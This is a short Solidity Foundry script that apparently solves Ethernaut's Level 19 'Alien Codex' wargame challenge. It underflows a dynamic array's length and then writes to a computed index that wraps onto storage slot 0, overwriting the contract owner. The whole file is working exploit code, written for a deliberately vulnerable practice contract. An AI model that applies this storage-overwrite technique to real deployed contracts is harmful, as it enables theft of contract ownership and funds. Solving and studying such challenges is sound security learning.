// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                       LEVEL 19 - ALIEN CODEX                 │
// ================================================================
interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        IAlienCodex alienCodex = IAlienCodex(targetContractAddress);

        vm.startBroadcast();

        // Make contact with the alien codex
        alienCodex.makeContact();

        // Retract the codex length by 1, causing an underflow
        alienCodex.retract();

        // Calculate the index in the array where the owner is stored
        uint256 arraySlot = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 ownerSlot = 0;
        uint256 indexToModify = type(uint256).max - arraySlot + ownerSlot + 1;

        // Overwrite the owner with msg.sender
        alienCodex.revise(indexToModify, bytes32(uint256(uint160(msg.sender))));
        vm.stopBroadcast();
    }
}
